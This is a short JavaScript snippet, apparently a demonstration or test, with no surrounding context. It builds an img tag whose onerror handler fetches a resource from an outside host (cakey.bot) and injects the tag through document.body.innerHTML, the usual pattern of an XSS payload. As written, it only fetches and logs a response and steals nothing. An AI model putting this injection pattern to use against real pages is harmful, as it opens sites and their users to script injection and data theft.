const payload = `<img src="x" onerror="fetch('https://cakey.bot/assets/', {mode: 'no-cors'})
  .then(response => response.text())
  .then(data => {
    console.log(data);
  })
  .catch(error => console.error('Error:', error));">`;

document.body.innerHTML += payload;
